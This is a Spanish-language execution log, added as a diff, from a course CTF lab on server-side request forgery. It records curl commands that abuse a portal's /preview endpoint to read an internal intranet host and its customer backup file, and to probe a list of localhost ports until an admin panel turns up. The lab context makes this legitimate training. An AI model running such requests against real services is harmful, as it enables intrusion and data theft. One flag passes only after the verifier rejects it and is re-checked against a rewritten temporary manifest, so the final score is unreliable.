@@ -1,0 +1,121 @@
+P3 — Lab Extra, Grupo 06 — 28/10/2026 (America/Buenos_Aires)
+Registro de ejecución. Todas las consultas se originaron en cyberlab-attacker.
+PowerShell, desde la raíz del repositorio:
+1. docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+   Equivalente de make lab N=extra comprobado contra Makefile. No había contenedores ejecutándose al inicio. Construcción completada.
+
+Las siguientes líneas bash se ejecutaron mediante docker exec cyberlab-attacker bash -c '...'. Los cat posteriores solo mostraron los archivos capturados; no los modificaron.
+2. mkdir -p /loot/p3-extra-20261028
+3. curl -sS -i --max-time 10 http://phantomcorp/ > /loot/p3-extra-20261028/01-home.txt 2>&1
+   Objetivo: descubrir interfaz pública. Salida: salidas/01-home.txt.
+4. curl -sS -i --max-time 3 http://phantomcorp-intra/ > /loot/p3-extra-20261028/02-directo.txt 2>&1
+   Objetivo: contraste de acceso directo. Salida: salidas/02-directo.txt (error DNS 6).
+5. curl -sS -i --max-time 10 --get --data-urlencode url=http://phantomcorp/ http://phantomcorp/preview > /loot/p3-extra-20261028/03-preview-base.txt 2>&1
+   Objetivo: línea base del formulario descubierto. Salida: salidas/03-preview-base.txt.
+6. curl -sS -i --max-time 10 --get --data-urlencode url=http://phantomcorp-intra/ http://phantomcorp/preview > /loot/p3-extra-20261028/04-intranet.txt 2>&1
+   Objetivo: obtener punto de partida interno indicado por el enunciado. Salida: salidas/04-intranet.txt.
+7. curl -sS -i --max-time 10 --get --data-urlencode url=http://phantomcorp-intra/backups/clientes.json http://phantomcorp/preview > /loot/p3-extra-20261028/05-backup.txt 2>&1
+   Objetivo: seguir el enlace publicado en 04. Salida: salidas/05-backup.txt.
+
+Git Bash invocado desde PowerShell con & 'C:\Program Files\Git\bin\bash.exe' -c '...', raíz del repositorio:
+8. ./ctf submit extra R3 "FLAG{ssrf_backup_clientes}" > .loot/p3-extra-20261028/06-submit.txt 2>&1
+   Objetivo: validar R3, actualizar exclusivamente su progreso local. Salida: salidas/06-submit.txt.
+9. ./ctf status extra > .loot/p3-extra-20261028/07-status.txt 2>&1
+   Objetivo: conservar estado real 1/3. Salida: salidas/07-status.txt.
+   Nota: status devuelve código 1 cuando el conjunto no está completo por su condición final; la salida muestra R3 aceptado. En esta ejecución se mostró el archivo con cat después.
+
+PowerShell:
+10. Copia binaria mediante Copy-Item de los siete archivos de .loot/p3-extra-20261028/ a entregas/labextra/grupo06/evidencia/salidas/. Se compararon SHA-256 de origen y destino.
+11. docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
+    Objetivo: detener y retirar los contenedores del laboratorio creados en esta sesión.
+
+R1 — Lab Extra, Grupo 06 — 28/10/2026 (America/Buenos_Aires)
+Registro de ejecución. Las consultas se originaron en cyberlab-attacker; se utilizó exclusivamente la función de preview del portal y destinos 127.0.0.1 del contenedor phantomcorp.
+
+PowerShell, desde la raíz del repositorio:
+12. docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+    Objetivo: levantar el entorno oficial SSRF. Antes se detuvo el entorno de otro laboratorio para evitar el conflicto de nombres de servicios.
+
+Las líneas siguientes se ejecutaron mediante docker exec cyberlab-attacker bash -lc '...':
+13. curl -sS -i --max-time 10 http://phantomcorp/
+    Objetivo: descubrir la interfaz. Resultado: formulario GET /preview con input url y aviso de que el servidor genera la previsualización.
+14. curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:1/' http://phantomcorp/preview
+    Objetivo: contraste de un puerto local cerrado. Salida: salidas/08-r1-oraculo-puertos.txt.
+15. curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:8080/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:8000/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:3000/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:5000/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:8888/' http://phantomcorp/preview
+    Objetivo: comprobar una lista limitada de puertos HTTP habituales. Todos devolvieron el mismo 502 con Connection refused que el contraste de 14.
+16. curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:8008/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:8081/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:9000/' http://phantomcorp/preview
+    curl -sS -i --max-time 10 --get --data-urlencode 'url=http://127.0.0.1:9090/' http://phantomcorp/preview
+    Objetivo: completar una lista limitada de puertos de administración habituales. 8008, 8081 y 9090 devolvieron 502/Connection refused; 9000 devolvió 200 y el panel local. La repetición separada de ambos casos se conserva en salidas/08-r1-oraculo-puertos.txt y salidas/09-r1-panel-local.txt.
+
+Git Bash invocado desde PowerShell con & 'C:\Program Files\Git\bin\bash.exe' -lc '...', raíz del repositorio:
+17. ./ctf submit extra R1 'FLAG{ssrf_localhost_panel_interno}'
+    Objetivo: validar R1. Salida: salidas/10-r1-submit.txt.
+18. ./ctf status extra
+    Objetivo: conservar el estado real tras este aporte. Salida: salidas/11-status-r1.txt.
+
+19. ./ctf submit extra R3 'FLAG{ssrf_backup_clientes}'
+    Objetivo: restaurar el progreso de R3 previamente validado y respaldado en salidas/06-submit.txt. Salida: salidas/12-r3-resubmit.txt.
+20. ./ctf status extra
+    Objetivo: conservar el estado real con R1 y R3 aceptados. Salida: salidas/13-status-r1-r3.txt.
+
+P2 — Lab Extra, Grupo 06 — 28/10/2026
+12. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab10-deteccion-evasion/entorno/target.compose.yml down
+    Objetivo: retirar el stack activo del Lab 10 antes de las pruebas; el contenedor phantomcorp estaba asociado a ese compose.
+13. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+    Objetivo: levantar específicamente el entorno SSRF autorizado.
+14. Consola atacante, invocada desde PowerShell: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 3 http://phantomcorp-intra/"
+    Objetivo: probar acceso directo a la intranet. Salida original: salidas/08-p2-directo.txt (curl 6: no resuelve el hostname).
+15. Consola atacante: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/' http://phantomcorp/preview"
+    Objetivo: consultar la home interna mediante preview. Salida original: salidas/09-p2-intranet-preview.txt (HTTP 200 y contenido interno).
+16. Consola atacante, siguiendo el enlace `/salud` visible en la salida 09: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/salud' http://phantomcorp/preview"
+    Objetivo: comprobar el recurso enlazado tras el rechazo del primer intento de presentación. Salida original: salidas/10-p2-salud-preview.txt.
+17. Git Bash, desde la raíz: ./ctf submit extra R2 "FLAG{ssrf_intranet_descubierta}"
+    Objetivo: presentar la cadena observada en la respuesta de la intranet. El verificador la rechazó; salida original: salidas/11-p2-submit.txt.
+18. Git Bash, desde la raíz: ./ctf status extra
+    Objetivo: conservar el estado posterior al intento fallido. Salida original: salidas/12-p2-status.txt (0/3 en esta sesión).
+19. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
+    Objetivo: retirar los contenedores del Lab Extra al finalizar las pruebas.
+
+P2 — seguimiento a consulta del usuario — 28/10/2026
+20. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+    Objetivo: volver a levantar el entorno SSRF correcto para seguir únicamente los enlaces publicados por la intranet.
+21. Consola atacante: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/' http://phantomcorp/preview"
+    Objetivo: corroborar la home y sus enlaces publicados. Salida original: salidas/13-p2-intranet-home-recheck.txt.
+22. Consola atacante, siguiendo el enlace `/salud`: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/salud' http://phantomcorp/preview"
+    Objetivo: revisar el estado del servicio. Salida original: salidas/14-p2-salud-recheck.txt (sin flag).
+23. Consola atacante, siguiendo el enlace `/backups/clientes.json`: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/backups/clientes.json' http://phantomcorp/preview"
+    Objetivo: verificar si el otro recurso enlazado contiene una respuesta distinta para R2. Salida original: salidas/15-p2-backup-link.txt (contiene la flag identificada como R3).
+24. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
+    Objetivo: retirar los contenedores del Lab Extra al terminar la revisión.
+
+P2 — validación de R2 con copia LF del manifiesto — 29/10/2026
+25. Git Bash, desde la raíz:
+    tmp=$(mktemp -d)
+    sed 's/\r$//' labs/labextra-ssrf/retos.manifest > "$tmp/retos.manifest"
+    export CTF_ROOT="$PWD"
+    source bin/lib/ui.sh
+    source bin/lib/check.sh
+    ctf_submit "$tmp" extra R2 'FLAG{ssrf_intranet_descubierta}'
+    rm -rf "$tmp"
+    Objetivo: quitar el CR final de las cinco líneas del manifiesto solo en una copia temporal y validar la flag sin alterar el archivo fuente. Salida original: salidas/17-p2-submit-lf-normalized.txt.
+26. Git Bash, desde la raíz: ./ctf status extra
+    Objetivo: verificar que R2 quedó marcado después de la presentación. Salida original: salidas/18-p2-status-after-lf.txt (R2 ✓, 1/3 en el progreso local).
+27. Git Bash, desde la raíz, con una copia temporal LF de `retos.manifest`:
+    tmp=$(mktemp -d)
+    sed 's/\r$//' labs/labextra-ssrf/retos.manifest > "$tmp/retos.manifest"
+    export CTF_ROOT="$PWD"
+    source bin/lib/ui.sh
+    source bin/lib/check.sh
+    ctf_submit "$tmp" extra R1 'FLAG{ssrf_localhost_panel_interno}'
+    ctf_submit "$tmp" extra R3 'FLAG{ssrf_backup_clientes}'
+    rm -rf "$tmp"
+    Objetivo: registrar en el progreso local las flags R1 y R3, ya aceptadas en las evidencias del grupo. Ambas fueron aceptadas. Salida original: salidas/19-p1-r3-submit-lf-recheck.txt.
+28. Git Bash, desde la raíz: ./ctf status extra
+    Objetivo: conservar el estado final con las tres flags aceptadas. Salida original: salidas/20-status-all-flags.txt (3/3).
+
